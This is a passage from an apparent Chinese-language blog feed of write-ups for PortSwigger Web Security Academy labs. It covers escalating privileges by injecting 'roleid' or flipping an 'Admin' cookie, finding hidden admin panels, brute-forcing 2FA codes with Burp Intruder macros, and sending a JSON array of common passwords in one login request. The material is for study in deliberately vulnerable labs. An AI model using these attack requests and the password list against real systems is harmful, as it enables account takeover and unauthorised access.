&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>输入&lt;code>Email&lt;/code>后点击&lt;code>Update email&lt;/code>
&lt;img alt="Update email" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-2.jpg">&lt;/li>
&lt;li>观察对应的Request、Response&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;wiener@normal-user.net&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/my-account&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">126&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wiener&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;email&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wiener@normal-user.net&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;apikey&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;b4TKwc7GKnd2UGazpdC4u8QnlvAU6Ym3&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;roleid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>尝试使用相同的&lt;code>url&lt;/code>更新&lt;code>roleid&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;wiener@normal-user.net&amp;#34;, &amp;#34;roleid&amp;#34;: 2}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/my-account&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">126&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wiener&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;email&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wiener@normal-user.net&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;apikey&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;b4TKwc7GKnd2UGazpdC4u8QnlvAU6Ym3&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;roleid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
&lt;li>访问&lt;code>/admin&lt;/code>并且点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: User role controlled by request parameter</title><link>/portswigger-posts/access-control-lab-user-role-controlled-by-request-parameter/</link><pubDate>Sun, 08 Dec 2024 19:12:29 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-role-controlled-by-request-parameter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>访问&lt;code>/admin&lt;/code>后出现&lt;code>Admin interface only available if logged in as an administrator &lt;/code>，其对应Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=3KZzj5osf2p8Nuq3s0z7JVUN9e95bK95; Admin=false&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>通过浏览器修改&lt;code>Cookie&lt;/code>中&lt;code>Admin&lt;/code>的值
&lt;img alt="Cookie" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/li>
&lt;li>刷新页面并且点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Unprotected admin functionality with unpredictable URL</title><link>/portswigger-posts/access-control-lab-unprotected-admin-functionality-with-unpredictable-url/</link><pubDate>Sun, 08 Dec 2024 19:03:01 +0800</pubDate><guid>/portswigger-posts/access-control-lab-unprotected-admin-functionality-with-unpredictable-url/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>查看Lab Response，并搜索&lt;code>admin&lt;/code>，会发现有admin管理页面
&lt;img alt="Search result" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-2.jpg">&lt;/li>
&lt;li>访问&lt;code>/admin-bse0oh&lt;/code>
&lt;img alt="Search result" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-3.jpg">&lt;/li>
&lt;li>点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Unprotected admin functionality</title><link>/portswigger-posts/access-control-lab-unprotected-admin-functionality/</link><pubDate>Sun, 08 Dec 2024 18:45:41 +0800</pubDate><guid>/portswigger-posts/access-control-lab-unprotected-admin-functionality/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>在Lab url后端新增&lt;code>robots.txt&lt;/code>，返回内容如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>User-agent: *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disallow: /administrator-panel
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>访问&lt;code>/administrator-panel&lt;/code>
&lt;img alt="Administrator panel" src="/img/2024/access-control-lab-unprotected-admin-functionality-2.jpg">&lt;/li>
&lt;li>点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA bypass using a brute-force attack</title><link>/portswigger-posts/authentication-lab-2fa-bypass-using-a-brute-force-attack/</link><pubDate>Sat, 07 Dec 2024 17:47:40 +0800</pubDate><guid>/portswigger-posts/authentication-lab-2fa-bypass-using-a-brute-force-attack/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>使用&lt;code>carlos:montoya&lt;/code>登录后，来到输入&lt;code>security code&lt;/code>页面，且输入错误2次后，会跳转回到登入页面；输入&lt;code>security code&lt;/code>对应Request如下
&lt;pre tabindex="0">&lt;code class="language-htttp" data-lang="htttp">POST /login2 HTTP/2
csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=1111
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>在进行爆破时，需要同时获取&lt;code>csrf&lt;/code>与&lt;code>mfa-code&lt;/code>参数&lt;/li>
&lt;li>&lt;code>csrf&lt;/code>需要通过登录操作从服务器端获取，题目建议使用Burp macros自动化获得&lt;code>csrf&lt;/code>
&lt;ol>
&lt;li>点击右上角&lt;code>Settings&lt;/code>进行页面，选择左侧&lt;code>Sessions&lt;/code>，再点击中间&lt;code>Session handling rules -&amp;gt; Add&lt;/code>&lt;/li>
&lt;li>在&lt;code>Rule actions&lt;/code>点击&lt;code>Add&lt;/code>，并选择&lt;code>Run a macro&lt;/code>
&lt;img alt="Run a macro" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-2.jpg">&lt;/li>
&lt;li>点击&lt;code>Add&lt;/code>
&lt;img alt="Add" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-3.jpg">&lt;/li>
&lt;li>使用&lt;code>HTTP history filter&lt;/code>过滤此次Lab的相关url
&lt;img alt="HTTP history filter" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-4.jpg">&lt;/li>
&lt;li>选择产生&lt;code>csrf&lt;/code>参数的3个相关HTTP
&lt;img alt="Macro Editor" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-5.jpg">&lt;/li>
&lt;li>点击&lt;code>OK&lt;/code>后回到主设定页面
&lt;img alt="Macro Editor" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-6.jpg">&lt;/li>
&lt;li>点击&lt;code>Scope&lt;/code>，并在&lt;code>URL scope&lt;/code>中选择&lt;code>Include all URLs&lt;/code>
&lt;img alt="URL scope" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-7.jpg">&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>将验证&lt;code>security code&lt;/code>HTTP发送至Burp Intruder&lt;/li>
&lt;li>使用Sniper attack模式，请求参数设定如下&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=§1111§
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="7">
&lt;li>参数1设定如下
&lt;img alt="Param 1" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-8.jpg">&lt;/li>
&lt;li>选择&lt;code>Resource poll&lt;/code>，并点击&lt;code>Create new resource pool&lt;/code>
&lt;img alt="Resource poll" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-9.jpg">&lt;/li>
&lt;li>点击&lt;code>Start attack&lt;/code>开始进行爆破，先查看前几个Response，内容应该包含&lt;code>Incorrect security code&lt;/code>，才表示&lt;code>csrf&lt;/code>的相关设定正确且生效&lt;/li>
&lt;li>通过&lt;code>Intruder attack results filter&lt;/code>过滤结果
&lt;img alt="Filter" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-10.jpg">&lt;/li>
&lt;li>根据爆破结果，将&lt;code>Set-Cookie&lt;/code>中的&lt;code>session&lt;/code>变量粘贴至浏览器的&lt;code>Cookie&lt;/code>
&lt;img alt="Cookie" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-11.jpg">
&lt;img alt="Cookie" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-12.jpg">&lt;/li>
&lt;li>刷新页面后即可解题
&lt;img alt="Solved" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-13.jpg">&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Broken brute-force protection, multiple credentials per request</title><link>/portswigger-posts/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request/</link><pubDate>Sat, 07 Dec 2024 17:22:28 +0800</pubDate><guid>/portswigger-posts/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>通过页面进行错误登录尝试，Response如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;username&amp;#34;:&amp;#34;carlos&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;1&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>将Request发送至Burp Repeater，并将&lt;code>password&lt;/code>参数替换为&lt;code>JSON array&lt;/code>格式，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;username&amp;#34;:&amp;#34;carlos&amp;#34;,&amp;#34;password&amp;#34;:[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123456&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;password&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;12345678&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;qwerty&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123456789&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;12345&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1234&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;111111&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1234567&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;dragon&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123123&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;baseball&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;abc123&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;football&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;monkey&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;letmein&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;shadow&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;master&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;666666&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;qwertyuiop&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123321&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;mustang&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1234567890&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;michael&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;654321&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;superman&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1qaz2wsx&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;7777777&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;121212&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;000000&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;qazwsx&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123qwe&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;killer&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;trustno1&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;jordan&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;jennifer&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;zxcvbnm&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;asdfgh&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;hunter&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;buster&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;soccer&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;harley&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;batman&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;andrew&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;tigger&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sunshine&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;iloveyou&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;2000&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;charlie&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;robert&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;thomas&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;hockey&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;ranger&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;daniel&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;starwars&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;klaster&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;112233&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;george&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;computer&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;michelle&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;jessica&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;pepper&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1111&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;zxcvbn&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;555555&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;11111111&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;131313&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;freedom&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;777777&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;pass&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;maggie&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;159753&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;aaaaaa&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;ginger&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;princess&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;joshua&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;cheese&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;amanda&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;summer&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;love&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;ashley&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;nicole&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;chelsea&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;biteme&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;matthew&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;access&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;yankees&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;987654321&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;dallas&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;austin&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;thunder&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;taylor&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;matrix&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;mobilemail&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;mom&amp;#34;,
